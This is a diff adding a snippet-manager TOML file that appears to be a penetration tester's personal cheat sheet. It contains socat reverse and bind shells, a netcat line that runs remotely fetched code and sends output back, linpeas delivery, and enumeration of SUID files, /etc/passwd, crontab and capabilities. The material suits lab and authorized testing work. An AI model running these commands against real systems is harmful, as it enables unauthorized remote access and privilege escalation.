@@ -1,0 +1,164 @@
+[[snippets]]
+  description = "serv"
+  command = "python3 -m http.server <port>"
+  output = ""
+
+[[snippets]]
+  description = "upload linpeas with nc"
+  command = "nc -l <port:> </usr/share/peass/linPEAS/linpeas.sh"
+  output = ""
+
+[[snippets]]
+  description = "Excute from memory and send output back to the host"
+  command = "nc <ip>:<port> | sh | nc <ip2:> <port2:>"
+  output = ""
+
+[[snippets]]
+  description = "save log file of remote machine"
+  command = "nc -lvnp <port:> | tee <file:>"
+  output = ""
+
+[[snippets]]
+  description = "linux-exploit-suggester-2.pl"
+  command = "wget 'https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl' -O linux-exploit-suggester-2.pl && chmod +x linux-exploit-suggester-2.pl"
+  output = ""
+
+[[snippets]]
+  description = "reverse shell socat remote"
+  command = "socat TCP:<local-ip>:<local-port> EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane"
+  output = ""
+
+[[snippets]]
+  description = "reverse shell socat local"
+  command = "socat TCP-L:<local-port> -"
+  output = ""
+
+[[snippets]]
+  description = "bind shell socat target"
+  command = "socat TCP-L:<local-port> EXEC:\"bash -li\""
+  output = ""
+
+[[snippets]]
+  description = "bind shell socat local"
+  command = "socat TCP:<target-ip>:<target-port> -"
+  output = ""
+
+[[snippets]]
+  description = "vim"
+  command = "vim -p -c 'set ignorecase smartcase wildignorecase tabstop=2 softtabstop=2 shiftwidth=2 expandtab paste' "
+  output = ""
+
+[[snippets]]
+  description = "copy ip address of tun0"
+  command = "ip -4 addr show tun0 | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}' | tr -d '\\n' | wl-copy"
+  output = ""
+
+[[snippets]]
+  description = "add padding to avoid invalid input for base64"
+  command = " | fold -w 4 | sed '$ d' | tr -d '\\n'"
+  output = ""
+
+[[snippets]]
+  description = "allow incoming traffic"
+  command = "sudo ufw allow from <ip:> proto tcp to any port <port:>"
+  output = ""
+
+[[snippets]]
+  description = "delete incoming traffic rule"
+  command = "sudo ufw delete allow from <ip:> proto tcp to any port <port:>"
+  output = ""
+
+[[snippets]]
+  description = "netcat reverse shell"
+  command = "tmux send-keys 'bash -l' Enter 'nc -lvnp <port:>' Enter"
+  output = ""
+
+[[snippets]]
+  description = "stabilize shell using python"
+  command = "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
+  output = ""
+
+[[snippets]]
+  description = "stabilize shell using stty and $TERM"
+  command = "tmux send-keys 'stty raw -echo; fg' Enter 'export TERM=xterm' Enter"
+  output = ""
+
+[[snippets]]
+  description = "fast port scan"
+  command = "nmap -F -sV -Pn -oN nmap_report_$(date +%Y%m%d%H%M%S).txt <ip:>"
+  output = ""
+
+[[snippets]]
+  description = "full port scan"
+  command = "nmap -sV -sC -oN nmap_report_$(date +%Y%m%d%H%M%S).txt <ip:>"
+  output = ""
+
+[[snippets]]
+  description = "scan vulnerabilities"
+  command = "nikto -port <port:> -h <ip:> | tee nikto_report_$(date +%Y%m%d%H%M%S).txt"
+  output = ""
+
+[[snippets]]
+  description = "file enumeration"
+  command = "gobuster dir -u <url:> -w /usr/share/dirbuster/directory-list-2.3-medium.txt -t 64 -x html,php,sh,js,css | tee gobuster_report_$(date +%Y%m%d%H%M%S).txt"
+  output = ""
+
+[[snippets]]
+  description = "dir enumeration"
+  command = "gobuster dir -u <url:> -w /usr/share/dirbuster/directory-list-2.3-medium.txt -t 64 | tee gobuster_report_$(date +%Y%m%d%H%M%S).txt"
+  output = ""
+
+[[snippets]]
+  description = "vhost enumeration"
+  command = "gobuster vhost -u <url:> -w /usr/share/wordlists/discovery/subdomains-top1million-5000.txt -t 64 | tee gobuster_report_$(date +%Y%m%d%H%M%S).txt"
+  output = ""
+
+[[snippets]]
+  description = "find SUID Binaries"
+  command = "find / -type f -perm -04000 -ls 2>/dev/null"
+  output = ""
+
+[[snippets]]
+  description = "show passwd"
+  command = "cat /etc/passwd"
+  output = ""
+
+[[snippets]]
+  description = "show system info"
+  command = "sh -c '( set -x; uname -a; cat /etc/os-release )'"
+  output = ""
+
+[[snippets]]
+  description = "list the privileges for the invoking user"
+  command = "sudo -l"
+  output = ""
+
+[[snippets]]
+  description = "show crontab"
+  command = "cat /etc/crontab"
+  output = ""
+
+[[snippets]]
+  description = "list enabled capabilities"
+  command = "getcap -r / 2>/dev/null"
+  output = ""
+
+[[snippets]]
+  description = "show no_root_squash"
+  command = "grep no_root_squash /etc/exports"
+  output = ""
+
+[[snippets]]
+  description = "edit hosts"
+  command = "sh -c '[ -z \"$EDITOR\" ] && export EDITOR=$(type vim >/dev/null 2>&1 && echo vim || echo vi); [ $(id -u) = 0 ] && $EDITOR /etc/hosts || sudoedit /etc/hosts'"
+  output = ""
+
+[[snippets]]
+  description = "generate random string"
+  command = "tr -dc A-Za-z0-9 </dev/urandom | head -c 20; echo ''"
+  output = ""
+
+[[snippets]]
+  description = "set $EDITOR"
+  command = "export EDITOR=$(type vim >/dev/null 2>&1 && echo vim || echo vi)"
+  output = ""
